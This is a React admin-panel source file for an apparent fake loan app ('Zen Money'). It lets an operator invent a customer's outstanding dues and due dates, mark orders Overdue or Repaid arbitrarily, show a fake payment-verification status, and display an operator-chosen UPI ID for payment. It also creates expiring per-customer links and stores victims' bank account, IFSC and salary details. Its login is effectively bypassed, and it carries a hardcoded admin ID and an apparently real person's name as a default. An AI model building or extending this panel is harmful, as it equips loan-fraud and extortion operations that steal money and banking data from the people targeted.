import React, { useState } from 'react';
import { LoanOrder } from '../utils/loan';

export interface AdminConfig {
  appName: string;
  appLogo: string;
  customerName: string;
  bankAddress: string;
  remainingAmount: number;
  loanAmount: number;
  paidAmount: number;
  dueDate: string;
  receivedDate: string;
  upiId: string;
  utrIcon: 'review' | 'failed' | 'success';
  utrStatus: string;
  linkTimeMinutes: number;
  activeGateway?: 'gateway1' | 'gateway2';
  gateway2Name?: string;
  gateway2UpiId?: string;
  gateway2Url?: string;
  verificationStatus?: 'pending' | 'approved';
  userSubmission?: {
    ifsc: string;
    account: string;
    gender: string;
    education: string;
    monthlySalary: string;
    submittedAt: string;
  };
}

interface AdminPanelProps {
  currentConfig: AdminConfig;
  orders: LoanOrder[];
  onUpdateConfig: (newConfig: AdminConfig) => void;
  onUpdateOrders: (newOrders: LoanOrder[]) => void;
  onApplyAndOpenCustomer: (newConfig: AdminConfig) => void;
  onCloseAdmin: () => void;
  onApproveUser: () => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({
  currentConfig,
  orders,
  onUpdateConfig,
  onUpdateOrders,
  onApplyAndOpenCustomer,
  onCloseAdmin,
  onApproveUser,
}) => {
  const [isLoggedIn, setIsLoggedIn] = useState(true);
  const [adminId, setAdminId] = useState('faysal');
  const [adminPassword, setAdminPassword] = useState('••••••••');
  const [loginError, setLoginError] = useState('');

  // Active admin sub-tab: 'config' | 'products' | 'links'
  const [activeAdminTab, setActiveAdminTab] = useState<'config' | 'products' | 'links'>('config');

  // Form states
  const [appName, setAppName] = useState(currentConfig.appName || 'Zen Money');
  const [selectedLogo, setSelectedLogo] = useState(currentConfig.appLogo || 'Zen Money');
  const [customerName, setCustomerName] = useState(currentConfig.customerName || 'BHAVIK KAMLESH SANGHVI');
  const [bankAddress, setBankAddress] = useState(currentConfig.bankAddress || 'HDFC BANK, ANDHERI (W), MUMBAI');
  const [remainingAmount, setRemainingAmount] = useState(currentConfig.remainingAmount || 12540);
  const [loanAmount, setLoanAmount] = useState(currentConfig.loanAmount || 11000);
  const [paidAmount, setPaidAmount] = useState(currentConfig.paidAmount || 0);
  const [dueDate, setDueDate] = useState(currentConfig.dueDate || '2026-11-02');
  const [upi, setUpi] = useState(currentConfig.upiId || 'paytm.s3u8921@pty');
  const [utrIcon, setUtrIcon] = useState<'review' | 'failed' | 'success'>(currentConfig.utrIcon || 'review');
  const [utrStatus, setUtrStatus] = useState(currentConfig.utrStatus || 'Under Review');
  const [linkTime, setLinkTime] = useState(currentConfig.linkTimeMinutes || 10);

  // New Product Creator state
  const [newProdName, setNewProdName] = useState('Zen Instant Credit');
  const [newProdAmt, setNewProdAmt] = useState('11000');
  const [newProdDue, setNewProdDue] = useState('02/11/2026');
  const [newProdStatus, setNewProdStatus] = useState<'Overdue' | 'Pending' | 'Repaid'>('Overdue');

  // Generated Link state
  const [generatedLinks, setGeneratedLinks] = useState<Array<{ id: string; url: string; user: string; expires: string }>>([
    {
      id: 'usr_98124',
      url: `?user=usr_98124&ref=faysal`,
      user: 'BHAVIK KAMLESH SANGHVI',
      expires: '10 mins',
    },
  ]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (!adminId.trim() || !adminPassword.trim()) {
      setLoginError('Admin ID এবং Password প্রদান করুন');
      return;
    }
    setLoginError('');
    setIsLoggedIn(true);
  };

  const handleSaveConfig = (e: React.FormEvent) => {
    e.preventDefault();
    const updated: AdminConfig = {
      ...currentConfig,
      appName,
      appLogo: selectedLogo,
      customerName,
      bankAddress,
      remainingAmount: Number(remainingAmount),
      loanAmount: Number(loanAmount),
      paidAmount: Number(paidAmount),
      dueDate,
      upiId: upi,
      utrIcon,
      utrStatus,
      linkTimeMinutes: Number(linkTime),
    };
    onUpdateConfig(updated);
    alert('Admin configuration saved successfully!');
  };

  const getStatusKey = (st: string): 'pend' | 'rej' | 'paid' | 'rev' | 'od' | 'pp' => {
    if (st === 'Repaid') return 'paid';
    if (st === 'Pending') return 'pend';
    return 'od';
  };

  const handleAddProduct = (e: React.FormEvent) => {
    e.preventDefault();
    const newOrder: LoanOrder = {
      no: `ORD-${Math.floor(100000 + Math.random() * 900000)}`,
      n: newProdName,
      amt: newProdAmt,
      d: newProdDue,
      ad: new Date().toLocaleDateString('en-IN'),
      st: newProdStatus,
      k: getStatusKey(newProdStatus),
      al: 'Loan amount',
      ic: 'zen',
      dl: 'Due date',
    };
    onUpdateOrders([newOrder, ...orders]);
    alert('New loan product created successfully!');
  };

  const handleDeleteOrder = (orderNo: string) => {
    if (confirm('Are you sure you want to remove this product/order?')) {
      onUpdateOrders(orders.filter((o) => o.no !== orderNo));
    }
  };

  const handleStatusUpdate = (orderNo: string, newStatus: 'Overdue' | 'Pending' | 'Repaid') => {
    onUpdateOrders(
      orders.map((o) => {
        if (o.no === orderNo) {
          return {
            ...o,
            st: newStatus,
            k: getStatusKey(newStatus),
          };
        }
        return o;
      })
    );
  };

  const handleGenerateLink = () => {
    const randomId = 'usr_' + Math.random().toString(36).substring(2, 9);
    const newLink = {
      id: randomId,
      url: `?user=${randomId}&client=${encodeURIComponent(customerName)}`,
      user: customerName,
      expires: `${linkTime} minutes`,
    };
    setGeneratedLinks([newLink, ...generatedLinks]);
    alert(`Unique random link generated for ${customerName}!`);
  };

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#f4f6f9] flex flex-col items-center justify-center p-4 font-sans select-none">
        <div className="w-full max-w-[400px] bg-white rounded-2xl shadow-xl p-8 text-center border border-gray-100">
          <div className="w-16 h-16 mx-auto rounded-2xl bg-amber-100/70 flex items-center justify-center mb-4">
            <svg className="w-10 h-10 text-amber-500" viewBox="0 0 24 24" fill="currentColor">
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
            </svg>
          </div>

          <h2 className="text-2xl font-bold text-gray-900 tracking-tight mb-1">
            Admin Login
          </h2>
          <p className="text-sm text-gray-500 mb-6">
            Enter Admin Credentials to Access Dashboard
          </p>

          <form onSubmit={handleLogin} className="space-y-4 text-left">
            <div>
              <label className="block text-xs font-semibold text-gray-700 mb-1">Admin ID</label>
              <input
                type="text"
                value={adminId}
                onChange={(e) => setAdminId(e.target.value)}
                className="w-full px-3.5 py-2.5 rounded-lg border border-indigo-200 bg-indigo-50/20 text-gray-900 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-gray-700 mb-1">Password</label>
              <input
                type="password"
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                className="w-full px-3.5 py-2.5 rounded-lg border border-indigo-200 bg-indigo-50/20 text-gray-900 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500"
              />
            </div>

            {loginError && <p className="text-xs text-red-500">{loginError}</p>}

            <button
              type="submit"
              className="w-full py-3 rounded-lg bg-[#3b49df] hover:bg-[#2f3bc0] text-white font-semibold text-sm cursor-pointer shadow-md"
            >
              Login to Admin
            </button>
          </form>

          <div className="mt-6 flex items-center justify-between text-xs text-gray-400">
            <span>Restricted Access</span>
            <button
              type="button"
              onClick={onCloseAdmin}
              className="text-indigo-600 hover:underline cursor-pointer"
            >
              Return to Customer App
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f3f4f8] py-6 px-3 flex justify-center font-sans text-gray-800">
      <div className="w-full max-w-lg bg-white rounded-2xl shadow-sm border border-gray-100 p-5 space-y-4">
        {/* Top Header */}
        <div className="flex items-center justify-between pb-3 border-b border-gray-100">
          <div>
            <h1 className="text-xl font-bold text-gray-900">Admin Control Panel</h1>
            <p className="text-xs text-gray-400">Products, Links, &amp; User Verification Manager</p>
          </div>
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={onCloseAdmin}
              className="text-xs bg-indigo-50 text-indigo-700 font-semibold px-3 py-1.5 rounded-lg hover:bg-indigo-100 cursor-pointer"
            >
              Customer View 📱
            </button>
            <button
              type="button"
              onClick={() => setIsLoggedIn(false)}
              className="text-xs bg-red-50 text-red-600 font-semibold px-3 py-1.5 rounded-lg hover:bg-red-100 cursor-pointer"
            >
              Logout
            </button>
          </div>
        </div>

        {/* Admin Navigation Tabs */}
        <div className="grid grid-cols-3 gap-1 bg-gray-100 p-1 rounded-xl text-xs font-semibold">
          <button
            type="button"
            onClick={() => setActiveAdminTab('config')}
            className={`py-2 rounded-lg transition-all cursor-pointer ${
              activeAdminTab === 'config' ? 'bg-white text-indigo-600 shadow-sm' : 'text-gray-600 hover:text-gray-900'
            }`}
          >
            ⚙️ Config &amp; UPI
          </button>
          <button
            type="button"
            onClick={() => setActiveAdminTab('products')}
            className={`py-2 rounded-lg transition-all cursor-pointer ${
              activeAdminTab === 'products' ? 'bg-white text-indigo-600 shadow-sm' : 'text-gray-600 hover:text-gray-900'
            }`}
          >
            📦 Products ({orders.length})
          </button>
          <button
            type="button"
            onClick={() => setActiveAdminTab('links')}
            className={`py-2 rounded-lg transition-all cursor-pointer ${
              activeAdminTab === 'links' ? 'bg-white text-indigo-600 shadow-sm' : 'text-gray-600 hover:text-gray-900'
            }`}
          >
            🔗 Link Generator
          </button>
        </div>

        {/* TAB 1: Config & User Verification */}
        {activeAdminTab === 'config' && (
          <div className="space-y-4">
            {/* User KYC Approval Card */}
            <div className="bg-amber-50/70 p-4 rounded-xl border border-amber-200 space-y-2">
              <div className="flex items-center justify-between">
                <h3 className="font-bold text-amber-900 text-sm">User Verification &amp; Approval</h3>
                <span
                  className={`text-[10px] px-2.5 py-0.5 rounded-full font-bold ${
                    currentConfig.verificationStatus === 'approved'
                      ? 'bg-emerald-100 text-emerald-800'
                      : 'bg-amber-200 text-amber-900'
                  }`}
                >
                  {currentConfig.verificationStatus === 'approved' ? 'Approved & Active' : 'Pending Verification'}
                </span>
              </div>
              <p className="text-xs text-gray-700">
                Customer Name: <span className="font-semibold">{customerName}</span>
              </p>
              {currentConfig.verificationStatus !== 'approved' && (
                <button
                  type="button"
                  onClick={onApproveUser}
                  className="w-full py-2 bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-xs rounded-lg cursor-pointer shadow"
                >
                  ✅ Approve User Login &amp; Unlock App
                </button>
              )}
            </div>

            <form onSubmit={handleSaveConfig} className="space-y-3 text-sm">
              <div className="bg-gray-50/60 p-4 rounded-xl border border-gray-200 space-y-3">
                <h3 className="font-bold text-gray-900 text-sm">Customer &amp; Payment Details</h3>

                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1">Customer Name</label>
                  <input
                    type="text"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm uppercase"
                  />
                </div>

                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1">Bank Address</label>
                  <input
                    type="text"
                    value={bankAddress}
                    onChange={(e) => setBankAddress(e.target.value)}
                    className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm uppercase font-mono text-xs"
                  />
                </div>

                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 mb-1">Remaining Due (₹)</label>
                    <input
                      type="number"
                      value={remainingAmount}
                      onChange={(e) => setRemainingAmount(Number(e.target.value))}
                      className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm font-mono"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-gray-600 mb-1">Due Date</label>
                    <input
                      type="date"
                      value={dueDate}
                      onChange={(e) => setDueDate(e.target.value)}
                      className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold text-gray-600 mb-1">Payment UPI ID (Shown to User for Pay)</label>
                  <input
                    type="text"
                    value={upi}
                    onChange={(e) => setUpi(e.target.value)}
                    placeholder="example@upi"
                    className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm font-mono"
                  />
                </div>
              </div>

              <button
                type="submit"
                className="w-full py-3 bg-[#3b49df] hover:bg-[#2f3bc0] text-white font-bold text-xs rounded-xl shadow cursor-pointer"
              >
                Save Admin Configurations
              </button>
            </form>
          </div>
        )}

        {/* TAB 2: Product & Order Manager */}
        {activeAdminTab === 'products' && (
          <div className="space-y-4">
            <div className="bg-indigo-50/70 p-4 rounded-xl border border-indigo-200 space-y-3">
              <h3 className="font-bold text-indigo-900 text-sm">Create New Loan Product / Order</h3>
              <form onSubmit={handleAddProduct} className="space-y-2.5 text-xs">
                <div>
                  <label className="block font-semibold text-gray-700 mb-1">Product Title</label>
                  <input
                    type="text"
                    value={newProdName}
                    onChange={(e) => setNewProdName(e.target.value)}
                    className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-xs"
                    required
                  />
                </div>
                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block font-semibold text-gray-700 mb-1">Amount (₹)</label>
                    <input
                      type="number"
                      value={newProdAmt}
                      onChange={(e) => setNewProdAmt(e.target.value)}
                      className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-xs font-mono"
                      required
                    />
                  </div>
                  <div>
                    <label className="block font-semibold text-gray-700 mb-1">Status</label>
                    <select
                      value={newProdStatus}
                      onChange={(e) => setNewProdStatus(e.target.value as any)}
                      className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-xs"
                    >
                      <option value="Overdue">Overdue</option>
                      <option value="Pending">Pending</option>
                      <option value="Repaid">Repaid</option>
                    </select>
                  </div>
                </div>
                <button
                  type="submit"
                  className="w-full py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white font-bold rounded-lg cursor-pointer shadow"
                >
                  + Add Product / Order
                </button>
              </form>
            </div>

            {/* Existing Orders List with Remove & Status Update */}
            <div className="space-y-2">
              <h4 className="font-bold text-gray-900 text-xs">Manage Existing Products ({orders.length})</h4>
              {orders.map((o) => (
                <div key={o.no} className="p-3 bg-white rounded-xl border border-gray-200 shadow-xs space-y-2 text-xs">
                  <div className="flex items-center justify-between">
                    <div>
                      <span className="font-bold text-gray-900">{o.n}</span>
                      <span className="text-gray-400 text-[10px] ml-2">({o.no})</span>
                    </div>
                    <span className="font-mono font-bold text-gray-800">₹{o.amt}</span>
                  </div>

                  <div className="flex items-center justify-between pt-1 border-t border-gray-100">
                    <div className="flex items-center gap-2">
                      <span className="text-gray-500 text-[11px]">Status:</span>
                      <select
                        value={o.st}
                        onChange={(e) => handleStatusUpdate(o.no, e.target.value as any)}
                        className="px-2 py-1 bg-gray-50 border border-gray-300 rounded text-xs font-semibold"
                      >
                        <option value="Overdue">Overdue</option>
                        <option value="Pending">Pending</option>
                        <option value="Repaid">Repaid</option>
                      </select>
                    </div>

                    <button
                      type="button"
                      onClick={() => handleDeleteOrder(o.no)}
                      className="px-2.5 py-1 bg-red-50 hover:bg-red-100 text-red-600 font-bold rounded cursor-pointer"
                    >
                      🗑️ Remove
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* TAB 3: Random Link Generator */}
        {activeAdminTab === 'links' && (
          <div className="space-y-4">
            <div className="bg-emerald-50/70 p-4 rounded-xl border border-emerald-200 space-y-3">
              <h3 className="font-bold text-emerald-900 text-sm">Generate Unique User Link</h3>
              <p className="text-xs text-gray-600">
                Create a unique secure link for different users with customized expiration time.
              </p>
              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1">Link Expiration (Minutes)</label>
                <input
                  type="number"
                  value={linkTime}
                  onChange={(e) => setLinkTime(Number(e.target.value))}
                  className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-xs font-mono"
                />
              </div>
              <button
                type="button"
                onClick={handleGenerateLink}
                className="w-full py-2.5 bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-xs rounded-lg cursor-pointer shadow"
              >
                🔗 Generate New Unique Link
              </button>
            </div>

            <div className="space-y-2">
              <h4 className="font-bold text-gray-900 text-xs">Generated Links History ({generatedLinks.length})</h4>
              {generatedLinks.map((link) => (
                <div key={link.id} className="p-3 bg-white rounded-xl border border-gray-200 text-xs space-y-1 font-mono">
                  <div className="flex items-center justify-between text-gray-500 text-[10px]">
                    <span>User: {link.user}</span>
                    <span>Expires: {link.expires}</span>
                  </div>
                  <div className="flex items-center justify-between bg-gray-50 p-2 rounded border border-gray-200">
                    <span className="text-indigo-600 truncate mr-2">/customer.php{link.url}</span>
                    <button
                      type="button"
                      onClick={() => {
                        navigator.clipboard?.writeText(window.location.origin + '/customer.php' + link.url);
                        alert('Link copied to clipboard!');
                      }}
                      className="px-2 py-1 bg-indigo-50 text-indigo-700 font-bold rounded text-[10px] cursor-pointer"
                    >
                      Copy
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
